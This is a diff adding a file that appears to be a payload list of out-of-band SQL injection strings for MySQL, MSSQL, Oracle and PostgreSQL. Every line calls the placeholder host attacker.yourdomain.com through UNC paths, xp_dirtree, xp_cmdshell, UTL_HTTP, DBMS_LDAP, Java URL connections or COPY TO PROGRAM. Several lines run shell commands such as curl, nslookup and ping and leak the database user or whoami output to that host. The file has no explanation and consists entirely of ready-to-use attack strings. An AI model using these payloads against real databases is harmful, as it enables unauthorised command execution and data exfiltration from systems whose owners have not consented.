@@ -1,0 +1,14 @@
+SELECT LOAD_FILE('\\\\attacker.yourdomain.com\\abc');
+SELECT * INTO OUTFILE '\\\\attacker.yourdomain.com\\abc.txt' FROM dual;
+SELECT sys_exec('curl http://attacker.yourdomain.com/$(whoami)');
+EXEC master..xp_dirtree '\\attacker.yourdomain.com\abc';
+EXEC master.dbo.xp_fileexist '\\attacker.yourdomain.com\abc';
+EXEC xp_cmdshell 'curl http://attacker.yourdomain.com/$(whoami)';
+EXEC xp_cmdshell 'ping attacker.yourdomain.com';
+BEGIN UTL_HTTP.REQUEST('http://attacker.yourdomain.com/' || user); END;
+BEGIN DBMS_LDAP.INIT('attacker.yourdomain.com', 389); END;
+DECLARE url java.net.URL; conn java.net.URLConnection;
+BEGIN url := new java.net.URL('http://attacker.yourdomain.com/' || user); conn := url.openConnection(); conn.connect(); END;
+COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.yourdomain.com';
+COPY (SELECT '') TO PROGRAM 'curl http://attacker.yourdomain.com/$(whoami)';
+COPY (SELECT '') TO PROGRAM 'ping -c 1 attacker.yourdomain.com';
